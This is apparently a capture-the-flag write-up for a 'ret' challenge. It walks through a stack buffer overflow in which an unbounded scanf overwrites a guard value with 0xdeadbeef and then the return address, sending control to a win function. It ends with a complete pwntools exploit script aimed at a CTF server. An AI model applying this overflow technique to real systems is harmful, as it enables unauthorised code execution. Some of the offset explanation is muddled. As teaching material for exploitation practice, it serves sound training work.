**This is a writeup for the ret challenge**

Our main function calls this function and this is where all of the challenge logic takes place
```
undefined4 main(void)

{
  func();
  return 0;
}
```

```
void func(void)

{
  undefined1 buf [64];
  int value;
  
  value = 0;
  __isoc99_scanf(&%s,buf);
  if (value != -0x21524111) {
    puts("you suck!\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  return;
}
```

In this function we see that we have our buffer that is initialized with 64 bytes of memory. We then see that we have a value int initialized to equal 0. Then we see that we are taking user input tand storing that in our buf array. Afterwards we have an if statement that checks if value == -0x21524111 (deadbeef).

Now the key takeaway of these two functions is that our win function is never called. So how do we get the flag if that function isn't called? Well we need to overwrite the return address so that when we hit it, it will "jump" to the win function.

So our main attack path for this challenge is to overwrite the buffer, overwrite our value function, and then overwrite our return address.

**Exploit Method**
So lets look at our stack layout
```
Stack[-0x8]:4 local_8
Stack[-0x10]:4 value
Stack[-0x50]:1 buf
```

So our the first thing we need to do is find the offset between buf and value
```
0x50 - 0x10 = 0x40
0x40 => 16 x 4 = 64
```

There is a 64 byte offset which means that we need to load 64 characters into buf in ordfer to fill it up. Our first part of our payload will look like this
```
payload = b"A" * 64
```

Our next step is to overwrite value so that it is equal to deadbeef. To do so, we will pack deadbeef into value. The next part of payload will look like this
```
payload += p32(0xdeadbeef)
```

So if you call back to the stack layout, we're currently at 0x10. The offset between 0x10 and the next part of the stack is
```
0x10 -0x8 = 16 - 8 = 8 bytes
```
So we see that there is an 8 byte difference, but deadbeef is only 4 bytes meaning that before we can even reach 0x8 we need to pack an additional 8 bytes. We will add this in our next part of our payload

Now that we have the correct value, we need to get to the return address. 

We see that we are at 0x8 and so we need to fill those additional 8 bytes before we can overwrite the return address. If we add these 8 bytes and the 4 btyes that we mentioned previously, we will be able to get to the return address. The next part of our payload will look like this
```
payload += b"B" * 12
```

Ok so now we are at the part where we can overwrite the return address. Since we also see that there is a win function when we decompile, we need to grab the address of the win function. We can do that with this line of code
```
TARGET_ADDRESS=elf.sybols["win"]
```

Now we can add this to our payload with
```
payload += p32(TARGET_ADDRESS)
```

Our final payload looks like this
```
payload=b"A" * 64 + p32(0xdeadbeef) + b"B" * 12 + p32(TARGET_ADDRESS)
```

**Final Exploit**
```
from pwn import *

HOST="ctf.hackucf.org"
PORT=9003
BINARY="./ret"

elf=ELF(BINARY)
context.binary=elf

TARGET_VALUE=0xdeadbeef
TARGET_ADDRESS=elf.symbols["win"]
BUFFER_SIZE=64

payload=b"A" * BUFFER_SIZE + p32(TARGET_VALUE) + b"B" * 12 + p32(TARGET_ADDRESS)

def exploit_remote():
    r=remote(HOST,PORT)
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    exploit_remote()
```